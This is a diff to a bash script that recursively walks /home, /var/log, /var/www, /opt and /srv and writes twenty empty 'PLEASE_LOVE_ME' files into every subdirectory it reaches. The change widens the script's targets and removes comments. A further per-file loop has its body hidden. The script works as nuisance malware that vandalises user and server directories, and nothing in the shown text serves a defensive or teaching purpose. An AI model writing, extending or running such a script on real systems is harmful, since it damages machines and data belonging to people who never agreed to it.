@@ -10,6 +10,14 @@ SKIP_DIRS=(
     /etc/systemd /etc/init.d
 )
 
+TARGET_DIRS=(
+    /home
+    /var/log
+    /var/www
+    /opt
+    /srv
+)
+
 # Safety checks
 [ -d "/usr/bin" ] || { echo "ABORT: /usr/bin missing"; exit 1; }
 if [ "$EUID" -eq 0 ] && [ "$2" != "--allow-root" ]; then
@@ -29,23 +37,20 @@ traverse() {
     local dir="$1"
     local depth="${2:-0}"
 
+    [ "$depth" -gt 8 ] && return
+
     for entry in "$dir"/*/; do
         [ -e "$entry" ] || continue
         entry="${entry%/}"
-
         should_skip "$entry" && continue
-
         if [ -d "$entry" ]; then
             traverse "$entry" $((depth + 1))
-
-            # Pure bash - no touch command
             for i in {1..20}; do
-                > "$entry/LOVE_ME_${i}"
+                > "$entry/PLEASE_LOVE_ME_${i}"
             done
         fi
     done
 
-    # Pure bash - no dirname command
     local count=50
     for file in "$dir"/*; do
         [ -f "$file" ] || continue
@@ -54,4 +59,9 @@ traverse() {
     done
 }
 
-traverse "${1:-/}"
+# Hit targets in safest order
+for target in "${TARGET_DIRS[@]}"; do
+    if [ -d "$target" ]; then
+        traverse "$target"
+    fi
+done
